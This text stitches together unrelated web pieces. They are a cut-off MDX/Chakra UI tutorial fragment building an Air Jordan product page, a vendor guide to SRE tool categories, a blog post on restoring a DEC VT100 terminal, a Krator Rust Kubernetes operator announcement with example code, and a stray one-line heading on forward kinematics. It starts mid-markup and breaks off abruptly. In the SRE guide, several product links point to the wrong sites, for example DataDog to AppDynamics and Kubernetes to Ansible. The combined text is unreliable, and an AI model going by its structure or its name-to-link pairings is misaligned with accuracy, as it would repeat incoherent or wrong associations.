</span><span>/&gt;</span><span></span></p><p><span></span><span>&lt;/</span><span>Flex</span><span>&gt;</span></p></pre></div></pre><p>We are using the Flex component provided to us from Chakra via the <code>MDXProvider</code>. This component allows us to quickly apply flex box props to the base element, a div. Even though the component is based upon a div we can give it semantic meaning by utilizing the <code>as</code> props and setting it the header. If we check our layout file again and look at our grid areas we can see that we have <code>edge</code> on the first and second rows. So we have set the grid area to edge and the row to 1.</p><p>This places our component in the top left hand corner of the page. We have given it a margin-left (ml) so that it doesn't hit the edge. As you can see from the code block above, we are inserting an image. If you navigate to <span><a target="_blank" rel="noopener noreferrer" href="https://www.transparentpng.com/search.php?q=nike">this</a></span> url you will see that it's a Nike swish (swoosh, tick? I dunno)</p><p>The copy</p><p>Let's add some copy to our page. This will be in the first column of our two middle columns. It will hold the title to our page and some copy about the Nike Air Jordan 1's, the product we are showcasing. Directly below the first Flex code block in the <code>page-one.mdx</code> file add the following:</p><pre><div><pre><p><span>&lt;</span><span>Flex</span><span></span></p><p><span></span><span>gridArea</span><span>=</span><span>"</span><span>text</span><span>"</span><span></span></p><p><span></span><span>justify</span><span>=</span><span>"</span><span>center</span><span>"</span><span></span></p><p><span></span><span>direction</span><span>=</span><span>"</span><span>column</span><span>"</span><span></span></p><p><span></span><span>h</span><span>=</span><span>"</span><span>100%</span><span>"</span><span></span></p><p><span></span><span>maxH</span><span>=</span><span>"</span><span>500px</span><span>"</span><span></span></p><p><span></span><span>w</span><span>=</span><span>"</span><span>90%</span><span>"</span><span></span></p><p><span></span><span>p</span><span>=</span><span>{</span><span>6</span><span>}</span><span></span></p><p><span></span><span>&gt;</span><span></span></p><p><span>    </span><span>&lt;</span><span>Flex</span><span>&gt;</span><span></span></p><p><span>      </span><span>&lt;</span><span>Text</span><span> </span><span>color</span><span>=</span><span>"</span><span>brand.lightGrey</span><span>"</span><span> </span><span>fontSize</span><span>=</span><span>"</span><span>6xl</span><span>"</span><span>&gt;</span><span></span></p><p><span>            Air Jordan </span><span>1</span><span></span></p><p><span>      </span><span>&lt;/</span><span>Text</span><span>&gt;</span><span></span></p><p><span>    </span><span>&lt;/</span><span>Flex</span><span>&gt;</span><span></span></p><p><span>    </span><span>&lt;</span><span>Box</span><span> </span><span>h</span><span>=</span><span>"</span><span>80%</span><span>"</span><span> </span><span>position</span><span>=</span><span>"</span><span>relative</span><span>"</span><span> </span><span>zIndex</span><span>=</span><span>"</span><span>101</span><span>"</span><span>&gt;</span><span></span></p><p><span>        </span><span>&lt;</span><span>Text</span><span> </span><span>my</span><span>=</span><span>{</span><span>6</span><span>}</span><span> </span><span>fontWeight</span><span>=</span><span>{</span><span>300</span><span>}</span><span> </span><span>color</span><span>=</span><span>"</span><span>brand.text</span><span>"</span><span> </span><span>fontSize</span><span>=</span><span>"</span><span>xl</span><span>"</span><span> </span><span>borderTop</span><span>=</span><span>"</span><span>solid 1px</span><span>"</span><span> </span><span>pt</span><span>=</span><span>{</span><span>6</span><span>}</span><span>&gt;</span><span></span></p><p><span>        The Air Jordan that was first produced </span><span>for</span><span> Michael Jordan </span><span>in</span><span> </span><span>1984</span><span> was designed by Peter </span><span>C</span><span>.</span><span> Moore</span><span>.</span><span> The red and black colorway </span><span>of</span><span> the Nike Air Ship</span><span>,</span><span> the prototype </span><span>for</span><span> the Jordan </span><span>I</span><span>,</span><span> was later outlawed by then</span><span>-</span><span>NBA</span><span> Commissioner David Stern </span><span>for</span><span> having very little white on </span><span>them</span><span> </span><span>(</span><span>this</span><span> rule</span><span>,</span><span> known </span><span>as</span><span> the </span><span>"51 percent"</span><span> rule</span><span>,</span><span> was repealed </span><span>in</span><span> the late </span><span>2000</span><span>s</span><span>)</span><span>.</span><span></span></p><p><span>        </span><span>&lt;/</span><span>Text</span><span>&gt;</span><span></span></p><p><span>        </span><span>&lt;</span><span>Text</span><span> </span><span>my</span><span>=</span><span>{</span><span>6</span><span>}</span><span> </span><span>fontWeight</span><span>=</span><span>{</span><span>300</span><span>}</span><span> </span><span>color</span><span>=</span><span>"</span><span>brand.text</span><span>"</span><span> </span><span>fontSize</span><span>=</span><span>"</span><span>xl</span><span>"</span><span> </span><span>borderBottom</span><span>=</span><span>"</span><span>solid 1px</span><span>"</span><span> </span><span>pb</span><span>=</span><span>{</span><span>6</span><span>}</span><span>&gt;</span><span></span></p><p><span>        After the Nike Air Ship was banned</span><span>,</span><span> Michael Jordan and Nike introduced the Jordan </span><span>I</span><span> </span><span>in</span><span> colorways </span><span>with</span><span> more white</span><span>,</span><span> such </span><span>as</span><span> the </span><span>"Chicago"</span><span> and </span><span>"Black Toe"</span><span> colorways</span><span>.</span><span> They used the Nike Air Ship</span><span>'s ban as a promotional tool in advertisements, hinting that the shoes gave an unfair competitive advantage.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>SREs are responsible for evaluating tools that can help reduce toil on their teams and make their applications more reliable for end-users. There are a lot of SRE tools out there, and it can be hard to know which ones are the most important to consider. We’ve compiled this guide to highlight the key categories of SRE tools and help you find the right fit for your team.</p><h2>Monitoring tools</h2><p>Monitoring tools are used to generate valuable metrics and insights about an application and help SREs do everything from creating benchmarks to debugging outages. Luckily, there are monitoring tools for practically anything you might want to measure relating to your application. These tools usually cover one or more of the following areas:&nbsp;<br></p><ul role="list"><li><strong>Application performance monitoring (APM)</strong>: Models the response times perceived by end users of your application and compares this against performance benchmarks to detect latency and outages.</li><li><strong>Network monitoring</strong>: Examines all the incoming and outgoing traffic routed through your network to help with load balancing, debug client/server issues, and stop network attacks like DOS attacks before they occur.&nbsp;</li><li><strong>Resource / infrastructure monitoring: </strong>Looks at the consumption rates and SLOs for the components of your application, like the CPU load for your Kubernetes clusters, to help with resource management.</li></ul><h3>What to look for in a monitoring tool</h3><p>No matter what type of monitoring tool you’re looking at, you’ll want to investigate the following important features:<br></p><ul role="list"><li><strong>Alerts: </strong>The tool should be able to generate alerts when metrics approach and exceed the thresholds that your SRE team identifies.</li><li><strong>Automated incident response: </strong>Ideally, your tools will also try to automatically fix any detected issues where possible, helping reduce your engineering overhead.&nbsp;</li><li><strong>Logging: </strong>Your monitoring tool should create detailed logs that contain all the information you would need to debug an issue, with configurable highlighting for easier consumption.&nbsp;</li><li><strong>Visualizations and dashboards: </strong>Monitoring tools offer various kinds of graphics and charts to help you interpret the data at a glance or communicate with your stakeholders. Depending on your use cases, you might want to look for tools that support certain types of data round-ups and visual representations.&nbsp;</li><li><strong>Supported integrations: </strong>Your tool should work seamlessly with your application components and services.&nbsp;</li></ul><h3>Common monitoring tools</h3><p>Here are some of the monitoring tools that we hear about often from SREs:&nbsp;</p><h4>Open-source tools</h4><p><a href="https://prometheus.io/" target="_blank">Prometheus</a>: A popular monitoring tool with an active community and broad range of features.</p><p><a href="https://grafana.com/" target="_blank">Grafana</a>: Helps you make dashboards and visualizations by integrating with other monitoring tools (often combined with Prometheus).&nbsp;</p><h4>Tools you can purchase</h4><p><a href="https://www.appdynamics.com/" target="_blank">AppDynamics</a>: A platform focusing on APM (though it also offers network and resource monitoring).</p><p><a href="https://www.appdynamics.com/" target="_blank">DataDog</a>: Offers a suite of monitoring tools to cover many different use cases.</p><p><a href="https://www.splunk.com/en_us/download/splunk-enterprise.html?utm_campaign=google_amer_en_search_brand&amp;utm_source=google&amp;utm_medium=cpc&amp;utm_content=Splunk_Enterprise_Demo&amp;utm_term=splunk&amp;_bk=splunk&amp;_bt=386199173970&amp;_bm=e&amp;_bn=g&amp;_bg=43997962767&amp;device=c&amp;gclid=CjwKCAiAq8f-BRBtEiwAGr3DgVfR2eqnx8gp6gDbtDTiPEVAcjJaAjRnT_mHhy8nUGRst6ycdQC_RBoCwmkQAvD_BwE">Splunk</a>: A generalized tool for managing large-scale data and deriving actionable insights.&nbsp;&nbsp;</p><h2>On-call management tools</h2><p>SREs and engineers are often responsible for being on call during working and non-working hours, prepared to react immediately to resolve any issue that might threaten the system’s health. Being on call can be stressful, and you want to be careful not to burn out your team. Fortunately, there are many tools SREs can use to help reduce the burden and make being on-call a bit less painful.&nbsp;</p><h3>What to look for in an on-call management tool</h3><p>While most on-call tools also help your team manage the incident itself, we’ll be covering incident management in the next section. Here are some on-call rotation specific features to help you prioritize your assessment:</p><ul role="list"><li><strong>Scheduling on-call rotations</strong>: Your tool should help you distribute the on-call duty equally and fairly across your team, with flexibility in case someone needs to trade on-call rotations at the last minute.&nbsp;&nbsp;&nbsp;</li><li><strong>Sharing on-call calendars</strong>: Sometimes an issue touches multiple components, and several on-call engineers need to be involved in the incident response. For that reason, it’s important that your tool provides a centralized way to view the on-call calendars across your organization.&nbsp;</li><li><strong>Alerting on-call engineers: </strong>This one is pretty obvious, but it’s absolutely essential. Your on-call tool needs to integrate with your monitoring tools to deliver alerts, and it must provide a payload with enough context so that the on-call engineer can address the issue. Your tool should also give you rules-based configurations for alert routing and controls to combat spammy alerts, which lead to burnout.&nbsp;</li></ul><h3>Common tools for on-call management</h3><p>Popular on-call management tools include <a href="https://www.splunk.com/en_us/software/splunk-on-call.html" target="_blank">PagerDuty</a>, <a href="https://www.atlassian.com/software/opsgenie" target="_blank">Splunk OnCall</a> (formerly VictorOps), and Atlassian’s <a href="https://www.atlassian.com/software/opsgenie" target="_blank">Opsgenie</a>.</p><h2>Incident management tools</h2><p>Inevitably, failures will occur in your system, and the person on-call is going to need powerful tools to help fix issues in the moment and make sure that they don’t happen again. According to <a href="https://sre.google/sre-book/being-on-call/" target="_blank">Google’s SRE Book</a>, managing an incident successfully comes down to three things: (1) clear escalation paths, (2) well-defined response procedures, and (3) a blameless post-mortem culture. SREs can find tools to codify these practices and help your team communicate better and resolve incidents faster.&nbsp;</p><h3>What to look for in an incident management tool</h3><ul role="list"><li><strong>Issue triage: </strong>Your tool should help you configure issue types and severity levels so that you know how to prioritize and when to escalate.&nbsp;</li><li><strong>Escalation pathways: </strong>Whether issues are manually or automatically escalated, you should be able to quickly get the right people involved and easily share all of the context they need to understand the issue.&nbsp;</li><li><strong>Runbooks / workflows: </strong>Depending on the issue classification, your tool should hand over the runbook of predefined steps the on-call engineers need to follow. Your tool should also be able to automatically execute workflows if certain conditions are met.&nbsp;</li><li><strong>Real-time communication: </strong>Your tool should integrate with the apps your team uses to communicate, like Slack, Jira, or even Zoom, to share information automatically and free you up to focus on the issue at hand. It should also create a historical document of the incident response that your team can refer to later on.</li><li><strong>Data-driven issue analysis: </strong>Ideally, your tool will give you all the data you need to understand what happened and focus on how it can be avoided next time, instead of placing blame on individuals.&nbsp;</li></ul><h3>Common incident management tools</h3><p>All of the on-call management tools previously mentioned also feature some form of incident management. Additional dedicated tools for this purpose include <a href="http://servicenow.com/" target="_blank">Blameless</a>, <a href="http://servicenow.com/" target="_blank">ServiceNow</a>, and Netflix’s open source crisis management tool, <a href="http://blameless.com/" target="_blank">Dispatch</a>.&nbsp;<br></p><h2>Configuration/Automation tools</h2><p>A main function of the SRE role is to automate away the mindless and busywork tasks of software development. Automated configurations can be used to ensure that toil is reduced and the same steps are always repeated when provisioning, managing, and destroying resources.&nbsp;</p><h3>What to look for in an configuration tool</h3><ul role="list"><li><strong>Infrastructure as code: </strong>This paradigm means that your infrastructure specifications live in a file, which can be run to recreate your configuration in the event of an outage. Most automation tools will have their own language for declaring the desired configuration.&nbsp;</li><li><strong>Execution planning: </strong>Your tool should offer a preview of the effects of your changes before you run the automation, to make sure there are no unanticipated consequences.</li><li><strong>Automated workflows:</strong> The tool should allow you to enforce steps that are always followed when performing a task, like deploying an application, and let you run these workflows automatically.&nbsp;</li><li><strong>Supports container orchestration: </strong>If you use a container orchestration service like <a href="https://www.ansible.com/" target="_blank">Kubernetes</a> to deploy your services, your configuration tool should be compatible.</li></ul><h3>Common configuration tools</h3><p>Popular tools for automating your infrastructure configurations are <a href="http://terraform.io/" target="_blank">Terraform</a> and <a href="http://terraform.io/" target="_blank">Ansible</a>.&nbsp;</p><h2>Microservice catalog tools</h2><p>To make sure that incidents are avoided in the first place, SRE teams should look for tools that help them enforce high-level policies and best practices. A key tenet of microservice catalog tools should be governance over your service oriented architecture. Governance refers to <em>what </em>rules and processes the team follows, as well as <em>who </em>is responsible for reliability across different services and applications. This helps avoid tribal knowledge, and is especially important when teams work remotely and manage many different microservices.&nbsp;</p><h3>What to look for in a microservice catalog tool</h3><ul role="list"><li><strong>Supports a production readiness review (PRR): </strong>A key process for SREs is a PRR: stepping through a predefined checklist to make sure that the software is ready to deploy. This might include things like ensuring that you’ve set up load balancing and end-to-end testing.<strong>&nbsp;</strong></li><li><strong>Transparent ownership: </strong>This tool should create a catalog of services with their owners clearly identified, so it’s easy to look up who is responsible for what.&nbsp;</li><li><strong>Integrates with your </strong><a href="https://www.getcortexapp.com/list/integrations" target="_blank"><strong>existing tools</strong></a><strong>: </strong>All the best practices you’re trying to enforce should be visible within one tool. This means, for example, that your APM set-up and on-call rotations should appear alongside the catalog of your services, so you don’t have to refer to multiple tools to know where to find important data.</li><li><strong>Automatic updates: </strong>When your configurations or policies change, you shouldn’t need to make manual edits in the tool.&nbsp;</li></ul><h3>Common microservice catalog tools</h3><p>The most common governance tool we’ve seen is unfortunately a giant spreadsheet (or, worse, several spreadsheets!). Since this is the opposite of the SRE philosophy, we’ve created Cortex to fill the gap. Our <a href="https://assets.website-files.com/5ec5ad1413d6c1261e587937/5f727be73405af82f83b0972_Screen%20Shot%202020-09-28%20at%205.01.49%20PM-p-1080.png" target="_blank"><strong>microservice catalog</strong></a><strong> </strong>makes it easy to see your services and owners in one place, and we foster accountability and show you how to improve using a gamified <a href="https://assets.website-files.com/5ec5ad1413d6c1261e587937/5ecc28b2e9133b2ab44992a2_Screen%20Shot%202020-05-25%20at%201.20.53%20PM-p-1080.png" target="_blank"><strong>scorecard</strong></a>.&nbsp;<br></p><p>With the right tools, your SRE team will be able to spend their energies improving your product’s reliability and performance instead of dealing with toil and overhead.

<p>I thank Daniele F. for donating this terminal. He contacted me from&nbsp;the <a href="https://www.oldcomputr.com/donate/">donation page</a>&nbsp;at the end of May but I couldn’t&nbsp;retrieve it until&nbsp;the beginning of October, when I passed through&nbsp;Verona while I was going to Brusaporto (a few kilometres from Bergamo) where I attended an annual <a href="http://www.brusaretro.it/">retrocomputing meeting</a>.</p>

<p>The terminal, after a thorough cleaning and an accurate inspection, turned on without any problems. It was just dusty and dirty.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240.jpg" alt="Digital VT100 - dirty" width="1080" height="720" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240-300x200.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240-1024x683.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-dirty-7240-624x416.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>The first item I started to clean was the keyboard. The next picture shows it before and after the cleaning process.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241.jpg" alt="Digital VT100 - keys before / after" width="1080" height="889" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241.jpg 1080w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241-300x247.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241-1024x843.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-keys_before-after-7241-624x514.jpg 624w" sizes="(max-width: 1080px) 100vw, 1080px"></a></p>
<p>I know that I’ve said it before… detaching and cleaning every single key is boring. But it is a manual and repetitive task&nbsp;that frees&nbsp;my mind, I find it quite&nbsp;relaxing, and the final result is always&nbsp;worth the time spent. Look at the next photo: beautiful, clean, shiny keys, with that mechanical feeling&nbsp;I sometimes miss on modern keyboards.</p>

<p>Here’s the keyboard board without the keys, after being cleaned:</p>

<p>The next picture shows the detail of the key.</p>

<p>There was no need for a “keycap puller”, the keys came off easily – so easily that I was lucky that no key was lost in all these years. This image is taken from the technical manual I found on the net.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/key.png"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/key.png" alt="Digital VT100 - key exploded view" width="800" height="997" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/key.png 800w, https://www.oldcomputr.com/wp-content/uploads/2015/11/key-300x374.png 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/key-241x300.png 241w, https://www.oldcomputr.com/wp-content/uploads/2015/11/key-624x778.png 624w" sizes="(max-width: 800px) 100vw, 800px"></a></p>
<p>After the keyboard I cleaned the main unit. The “Lunar” badge was probably&nbsp;added by the seller or the distributor, but I couldn’t find any information about it. Under the badge you can see the original colour of the case. If you look closely, you can see that the CRT monitor has a ghost image caused by showing the same static text many hours a day for years.&nbsp;Here’s the teardown picture.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown.jpg" alt="Digital VT100 - teardown" width="1248" height="5816" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown.jpg 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown-300x1398.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown-220x1024.jpg 220w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-teardown-624x2908.jpg 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>There’s a sticker under the keyboard, used to keep track of the terminal settings. In the setup screen that you can see in the first picture there are 4 series of 4 bits: each one sets an option, explained in the manual and summed up on the sticker.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370.png"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370.png" alt="Digital VT100 - setup" width="1248" height="593" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370.png 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370-300x143.png 300w, https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370-1024x487.png 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/12/digital_vt100-setup-7370-624x297.png 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>The unit was designed with easy reparability in mind. The top and bottom case are kept together with just four clips; a few other clips keep the main unit attached to the bottom case.</p>
<p>The motherboard and the graphic board can be pulled out by unscrewing a panel on the back.</p>
<p><a href="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363.jpg"><img loading="lazy" src="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363.jpg" alt="Digital VT100 - back" width="1248" height="858" srcset="https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363.jpg 1248w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363-300x206.jpg 300w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363-1024x704.jpg 1024w, https://www.oldcomputr.com/wp-content/uploads/2015/11/digital_vt100-back-7363-624x429.jpg 624w" sizes="(max-width: 1248px) 100vw, 1248px"></a></p>
<p>The power supply unit can be pulled from the main by lifting –&nbsp;you’ve already guessed – some clips.</p>

<p>The Selanar Graphics 100 is an additional third party board that lets the terminal show&nbsp;132 columns on screen and use advanced character formatting. It’s based on an Intel 8085 processor.</p>

<p>The most useful site I found about the VT100 is <a href="http://vt100.net/">VT100.net</a>; you can find the technical manual on the <a href="https://archive.org/details/bitsavers_decterminaT100TechnicalManualJul82_24218672">Internet Archive</a>. The only information about the Selanar Graphics 100 came from a Google Book scan of <a href="https://books.google.it/books?id=I_GaHXKwFpMC&amp;lpg=PA48&amp;pg=PA48#v=onepage&amp;q&amp;f=false">Computerword magazine</a> from August 1980. It cost $1195, and on the same page there’s an ad for the VT100 at $1550. That makes a total of $2745, that according to&nbsp;<a href="http://www.usinflationcalculator.com/">usinflationcalculator.com</a>&nbsp;corresponds to $7926 in 2015. For a terminal!</p>

<h2 id="announcing-krator">Announcing Krator</h2>

<p>Last September the Krustlet project refactored our API to employ a state
machine pattern for describing the lifecycle of Pods. The design of this API
was covered in depth in my
<a href="https://deislabs.io/posts/a-fistful-of-states/">previous blog post</a>.
Since then we have made a number of refinements to this interface and extended
our use of the pattern to individual containers within each Pod. These changes
also served to simplify and make more generic our API, and were done in part as
a stepping stone to the crate we are announcing today.</p>

<p>Since introducing this API, we have experienced positive feedback from the
community, including a number of requests to generalize this state machine
architecture so that it can be used to build Kubernetes Operators. It turned
out to be fairly straightforward to extract the “operator” portion of Krustlet
to a new crate, and today we are pleased to announce Krator (pronounced
crater), which stands for [K]ubernetes [R]ust st[at]e machine Operat[or].
Krator was released alongside the latest release of Krustlet, <code>0.6.0</code>, and
Krustlet now uses Krator internally to watch Pods and manage their state
machines.</p>

<p>Implementing an Operator involves a number of moving parts, so I have put
together a fairly minimal example, which I will walk through in the rest of
this post. If you just want to browse the code, it currently lives in the
Krustlet GitHub repository
<a href="https://github.com/deislabs/krustlet/tree/master/crates/krator">here</a>, and
documentation can be found on <a href="https://docs.rs/krator">docs.rs</a> (once Krustlet
<code>0.6.0</code> is released).</p>

<h2 id="writing-an-operator">Writing an Operator</h2>

<p>As an example, we will create an operator to manage <code>Moose</code> custom resources.
Using Krator, we will write a state machine that will describe the possible
states of a <code>Moose</code>, and how it should transition between these states. First,
we must write a custom resource definition, which is very easy using the
<code>CustomResource</code> derive macro from the <code>kube</code> crate!</p>

<pre><code>use kube_derive::CustomResource;
use serde::{Deserialize, Serialize};

#[derive(CustomResource, Debug, Serialize, Deserialize, Clone, Default)]
#[kube(
    group = "animals.com",
    version = "v1",
    kind = "Moose",
    derive = "Default",
    status = "MooseStatus",
    namespaced
)]
struct MooseSpec {
    /// Shoulder height in meters.
    height: f64,
    /// Body weight in kilograms.
    weight: f64,
    antlers: bool,
}
</code></pre>

<p>Each <code>Moose</code> has a spec which includes height, weight, and whether it has
antlers. <code>CustomResource</code> lets us also specify that a resource should support
the Kubernetes <code>status</code> API, which is required for a Krator Operator. We
specified that our status type was <code>MooseStatus</code> which we will define as
follows:</p>

<pre><code>#[derive(Debug, Serialize, Deserialize, Clone)]
enum MoosePhase {
    Asleep,
    Hungry,
    Roaming,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
struct MooseStatus {
    phase: Option&lt;MoosePhase&gt;,
    /// ~ Moose noises ~
    message: Option&lt;String&gt;,
}
</code></pre>

<p>As our state machine transitions to new states, Krator will automatically
update the object’s status with the Kubernetes API. To do this, Krator requires
that this status type implement a trait, <code>ObjectStatus</code>:</p>

<pre><code>impl ObjectStatus for MooseStatus {
    /// Use to generate an error status if an unhandled error occurs.
    fn failed(e: &amp;str) -&gt; MooseStatus {
        MooseStatus {
            message: Some(format!("Error tracking moose: {}.", e)),
            phase: None,
        }
    }

    /// Converts the arbitrary status type to a JSON patch to send to
    /// Kubernetes.
    fn json_patch(&amp;self) -&gt; serde_json::Value {
        // Generate a map containing only set fields.
        let mut status = serde_json::Map::new();

        if let Some(phase) = self.phase.clone() {
            status.insert("phase".to_string(), serde_json::json!(phase));
        };

        if let Some(message) = self.message.clone() {
            status.insert("message".to_string(), serde_json::Value::String(message));
        };

        // Create status patch with map.
        serde_json::json!({ "status": serde_json::Value::Object(status) })
    }
}
</code></pre>

<p>Next we need to define data types for:</p>

<ul>
<li>Data that is shared across state handlers for a single object (moose in this
case)</li>
<li>Data that is shared across state machines (shared between objects)</li>
</ul>

<p>We must also implement a trait, <code>ObjectState</code> which lets Krator know how all
of these types relate to the state machine.</p>

<pre><code>struct MooseState {
    /// All moose names start with 'M'
    name: String,
    /// Food mass in kilograms.
    food: f64,
}

struct SharedMooseState {
    /// Map moose name to set of moose friend's names (moose friendships are directed).
    friends: HashMap&lt;String, HashSet&lt;String&gt;&gt;,
}

#[async_trait::async_trait]
impl ObjectState for MooseState {
    type Manifest = Moose;
    type Status = MooseStatus;
    type SharedState = SharedMooseState;

    /// Clean up data related to a specific object.
    async fn async_drop(self, shared: &amp;mut Self::SharedState) {
        shared.friends.remove(&amp;self.name);
    }
}
</code></pre>

<p>We are now ready to implement our state machine. Below is a diagram of the
states we will represent. When a <code>Moose</code> object is first created, Krator will
initialize the state machine in the <code>Tagged</code> state. This will populate our
shared state and then transition to the <code>Roam</code> state. The moose will roam the
wilderness and with some probability encounter other moose and become friends.
Eventually, the moose will get hungry and transition to the <code>Eat</code> state, which
will replenish its <code>food</code> level but also make it tired. It will then transition
to the <code>Sleep</code> state for 60 seconds before returning to the <code>Roam</code> state. Note
that the final state, <code>Released</code>, is only reached when the <code>Moose</code> object is
marked for deletion in the Kubernetes API and Krator interrupts the state
machine and transitions to <code>Released</code>. In some operators, end states are also
reachable under certain conditions from within the state machine graph, such as
a Pod transitioning to <code>Completed</code>.</p>

<p><img src="https://deislabs.io/images/moose-state-machine.svg" alt="Moose State Machine"></p>

<p>State implementations are currently a little verbose, so I will include a
single state implementation here. The rest can be found in
<a href="https://github.com/deislabs/krustlet/blob/master/crates/krator/examples/moose.rs">the complete example</a>.
The important information is within the <code>next</code> and <code>status</code> methods of each
trait implementation. The <code>status</code> method is called when each state is
<em>entered</em>, so it should describe the state it is associated with. We have
considered using macros for implementing <code>State</code>, but have not been satisfied
with Rust’s error messages for errors originating from within these macros. If
you have any experience with macros and think you can come up with something
nice, please let us know!</p>

<p>The <code>next</code> method is the main code block for each state, sometimes referred to
as the state handler. This method has a number of important arguments:</p>

<ul>
<li>It takes ownership of <code>self</code>.</li>
<li>An <code>Arc&lt;RwLock&lt;_&gt;&gt;</code> to access shared state. For more information on this API,
see the
<a href="https://docs.rs/tokio/1.0.2/tokio/sync/struct.RwLock.html">Tokio documentation</a>.</li>
<li>A mutable reference to the object state.</li>
<li>A <code>Manifest&lt;_&gt;</code> which acts as a
<a href="https://kubernetes.io/docs/reference/using-api/api-concepts/#efficient-detection-of-changes">reflector</a>.
This type implements the <code>Stream</code> API for detecting changes to the object
manifest within a state handler, or you can simply call <code>latest</code> to obtain
a clone of the current object manifest.</li>
</ul>

<pre><code>#[derive(Debug, Default)]
/// Moose is roaming the wilderness.
struct Roam;

async fn make_friend(
    name: &amp;str,
    shared: &amp;Arc&lt;RwLock&lt;SharedMooseState&gt;&gt;
) -&gt; Option&lt;String&gt; {
    let mut mooses = shared.write().await;
    for (other_moose, friends) in mooses.friends.iter_mut() {
        if name == other_moose {
            continue;
        }
        if !friends.contains(name) {
            friends.insert(name.to_string());
            return Some(other_moose.to_string());
        }
    }
    return None;
}

#[async_trait::async_trait]
impl State&lt;MooseState&gt; for Roam {
    async fn next(
        self: Box&lt;Self&gt;,
        shared: Arc&lt;RwLock&lt;SharedMooseState&gt;&gt;,
        state: &amp;mut MooseState,
        _manifest: Manifest&lt;Moose&gt;,
    ) -&gt; Transition&lt;MooseState&gt; {
        loop {
            tokio::time::delay_for(std::time::Duration::from_secs(5)).await;
            state.food -= 5.0;
            if state.food &lt;= 50.0 {
                return Transition::next(self, Eat);
            }
            let r: f64 = {
                let mut rng = rand::thread_rng();
                rng.gen()
            };
            if r &lt; 0.05 {
                if let Some(other_moose) = make_friend(&amp;state.name, &amp;shared).await {
                    info!("{} made friends with {}!", state.name, other_moose);
                }
            }
        }
    }

    async fn status(
        &amp;self,
        _state: &amp;mut MooseState,
        _manifest: &amp;Moose,
    ) -&gt; anyhow::Result&lt;MooseStatus&gt; {
        Ok(MooseStatus {
            phase: Some(MoosePhase::Roaming),
            message: Some("Gahrooo!".to_string()),
        })
    }
}
</code></pre>

<p>To finish our state machine, we must define valid transitions between states.
The compiler will ensure that we do not make invalid transitions, which helps
us to avoid undefined behavior.</p>

<pre><code>impl TransitionTo&lt;Roam&gt; for Tagged {}
impl TransitionTo&lt;Eat&gt; for Roam {}
impl TransitionTo&lt;Sleep&gt; for Eat {}
</code></pre>

<p>Alternatively, Krator provides a macro for deriving this trait:</p>

<pre><code>#[derive(Debug, Default, TransitionTo)]
#[transition_to(Roam)]
/// Moose is sleeping.
struct Sleep;
</code></pre>

<p>Finally we must implement the <code>Operator</code> trait to tie this all together. Note
that the state machine API itself does not require that the <code>Manifest</code> is a
valid Kubernetes API resource. This allows the state machine pattern to be used
with a broader set of types (we used it for containers, which are not a
Kubernetes resource type). This, however, will require you to reimplement the
function which drives the state machine, as we did for
<a href="https://github.com/deislabs/krustlet/blob/3b120ec6a00123afd1407d049b61282c67e71676/crates/kubelet/src/container/state.rs#L18">containers</a>.</p>

<p>To get the full benefit of Krator, which watches for changes to your API
resource, spawns state machines, and handles status updates, you will need to
satisfy additional trait bounds which are placed on associated types of the
<code>Operator</code> trait. Namely, <code>Manifest</code> must be
<a href="https://docs.rs/k8s-openapi/0.10.0/k8s_openapi/trait.Metadata.html"><code>Metadata&lt;Ty = ObjectMeta&gt;</code></a>,
<code>DeserializeOwned</code>, and <code>Default</code>. <code>Status</code> must be <code>ObjectStatus</code> (as
described above).</p>

<h2 id="forward-kinematics">Forward kinematics</h2>
<p>Calculating the current coordinates of a robot’s hand is easy.</p>
